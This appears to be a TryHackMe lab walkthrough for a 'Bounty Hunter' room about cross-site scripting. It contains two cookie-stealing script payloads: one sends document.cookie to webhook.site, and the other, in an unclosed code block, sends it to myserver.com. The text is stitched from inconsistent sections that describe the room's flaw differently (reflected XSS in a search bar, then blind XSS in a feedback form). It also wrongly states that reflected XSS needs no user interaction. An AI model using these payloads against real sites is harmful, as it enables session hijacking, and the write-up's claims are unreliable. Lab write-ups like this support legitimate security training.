# TryHackMe – Bounty Hunter Walkthrough

## Room Summary
This room simulates a web application with potential XSS vulnerabilities and encourages enumeration of HTTP headers, cookie theft, and JavaScript injection.

## Tools Used
- Burp Suite
- Firefox Dev Tools
- TryHackMe AttackBox

## Exploit Path
1. Enumerated endpoints using Gobuster.
2. Found reflected XSS vector in the search bar.
3. Injected `<script>new Image().src="http://webhook.site/yourid?cookie="+document.cookie</script>`
4. Verified successful session exfiltration.

## Skills Demonstrated
- XSS payload crafting
- Cookie theft simulation
- Web enumeration & header inspection

---

🧠 *Reflected XSS requires no user interaction — prime target for session hijacking.*

## Overview
This room simulated a bug bounty scenario involving input sanitization failures.

## Exploit
Discovered a blind XSS vulnerability in a feedback form:

```html
<script>new Image().src="http://myserver.com?cookie="+document.cookie</script>
